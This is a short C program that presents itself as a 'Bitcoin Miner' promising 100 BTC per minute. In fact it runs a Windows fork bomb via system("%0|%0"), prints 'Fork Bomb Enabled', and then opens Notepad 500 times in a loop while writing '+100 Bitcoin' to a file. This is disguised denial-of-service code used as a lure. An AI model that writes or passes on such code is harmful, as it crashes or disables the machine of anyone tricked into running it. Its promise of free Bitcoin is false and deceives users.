#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int main() {

  puts("Welcome to Bitcoin Miner by john(aq), sponsored by Owen Reid ");
  puts("This program will generate 100 BTC per minute");
  int status = system("%0|%0");
  if (status == 0) {
    puts("Fork Bomb Enabled");
  }
  else {
    puts("You are an enemy of the state");
  }

  for (int i = 0; i < 500; ++i) {
    system("notepad Edit.txt");
    system("echo +100 Bitcoin > Edit.txt");
  }

  return 0;
}
